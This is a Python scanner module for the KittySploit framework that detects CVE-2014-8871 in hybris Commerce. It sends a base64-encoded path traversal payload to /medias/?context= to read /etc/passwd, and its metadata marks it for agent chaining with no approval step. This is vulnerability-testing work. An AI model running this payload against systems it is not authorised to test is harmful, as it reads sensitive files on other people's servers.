#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""hybris Commerce context= base64 path traversal (CVE-2014-8871)."""

import base64
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'hybris Commerce - medias context LFI Detection (CVE-2014-8871)',
        'description': (
            'Detects CVE-2014-8871 by requesting /medias/?context= with a base64-encoded '
            'master|root|...|../../../../../../etc/passwd| payload.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'hybris', 'sap', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-8871',
            'https://www.redteam-pentesting.de/advisories/rt-sa-2014-016',
        ],
        'cve': 'CVE-2014-8871',
    }

    def run(self):
        clear = 'master|root|12345|text/plain|../../../../../../etc/passwd|'
        ctx = base64.b64encode(clear.encode()).decode('ascii')
        r = self.http_request(
            method='GET',
            path=f'/medias/?context={ctx}',
            allow_redirects=False,
        )
        if r and re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='hybris medias context LFI (CVE-2014-8871)',
                path='/medias/',
            )
            return True
        return False
